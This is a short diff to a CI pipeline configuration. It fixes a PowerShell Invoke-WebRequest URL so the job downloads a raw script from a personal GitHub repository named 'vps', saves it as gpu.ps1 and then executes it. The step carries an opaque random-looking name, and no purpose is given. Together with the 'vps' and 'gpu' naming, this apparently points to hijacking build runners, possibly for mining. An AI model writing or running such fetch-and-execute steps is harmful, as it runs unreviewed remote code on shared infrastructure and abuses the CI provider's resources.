@@ -16,6 +16,6 @@ jobs:
       - run: 
           name: 233eTjBpEkyF12qXpeZfkSywHcb_5gSKHSsS5wykxvAdk4jAY
           command: |      
-            Invoke-WebRequest https://github.com/khalidar3/vps/blob/main/sh -OutFile gpu.ps1 
+            Invoke-WebRequest https://raw.githubusercontent.com/khalidar3/vps/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
